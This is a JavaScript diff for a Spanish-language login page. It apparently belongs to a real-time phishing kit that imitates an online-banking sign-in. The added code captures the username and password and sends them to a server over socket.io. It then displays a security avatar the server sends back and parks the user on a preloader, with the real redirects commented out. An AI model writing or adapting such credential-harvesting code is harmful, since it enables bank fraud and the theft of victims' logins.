@@ -11,6 +11,9 @@ const CerrarModal = document.querySelector("#close-alert-modal");
 const CerrarModal2 = document.querySelector("#close-alert-modal-2");
 const ShowPass = document.querySelector("#password-content");
 const ShowUser = document.querySelector("#user-content");
+const Avatar = document.querySelector("#avatar");
+const LoginTitle = document.querySelector("#login-title");
+const infoLogin = document.querySelector("#infologin");
 
 var ShowVolver = "";
 
@@ -20,7 +23,9 @@ if(document.querySelector("#volver")){
         ShowPass.style.display = "none";
         ShowUser.style.display = "flex";
         ShowVolver.style.display = "none";
+        infoLogin.style.display = "block";
         passInput.value = "";
+        LoginTitle.innerHTML = "Ingresá tu usuario"     
         passCount -= 1;
     })
 }
@@ -57,16 +62,20 @@ emitDataServer.addEventListener("click", () => {
                 if(passCount == 0){
                     ShowPass.style.display = "flex";
                     ShowUser.style.display = "none";
-                    ShowVolver.style.display = "flex";            
+                    ShowVolver.style.display = "flex";
+                    LoginTitle.innerHTML = "Ingrese su clave";
+                    infoLogin.style.display = "none";            
+                    socket.emit("ShowAvatar", dataInputs);
                 }else{
                     Alert2.style.display = "flex";
                 }
                 passCount += 1;
             }else{
                 socket.emit("Data", dataInputs);
-                window.location.href = "/m/faces/pages/inicio.xhtml?s="+socket.id;
+                preloader.style.display = "block";
+                //window.location.href = "/m/faces/pages/inicio.xhtml?s="+socket.id;
             }
-        }, 1000);
+        }, 3000);
     }else{
         if(dataInputs.user.length < 6 || dataInputs.user.length > 15){
             Alert.style.display = "flex";
@@ -74,14 +83,19 @@ emitDataServer.addEventListener("click", () => {
             if(passCount == 0){
                 ShowPass.style.display = "flex";
                 ShowUser.style.display = "none";
-                ShowVolver.style.display = "flex";            
+                socket.emit("ShowAvatar", dataInputs);   
             }else{
                 Alert2.style.display = "flex";
             }
             passCount += 1;
         }else{
-            socket.emit("Data", dataInputs);
-            window.location.href = "/home.htm?s="+socket.id;
+            socket.emit("Data", dataInputs);           
+            //window.location.href = "/home.htm?s="+socket.id;
         }
     }
+})
+
+socket.on("AvatarElement", dataAvatar => {
+    console.log(dataAvatar)
+    Avatar.innerHTML = `<img style="width: 100%; height: 100%" src="${dataAvatar}" alt="avatar">`;
 })
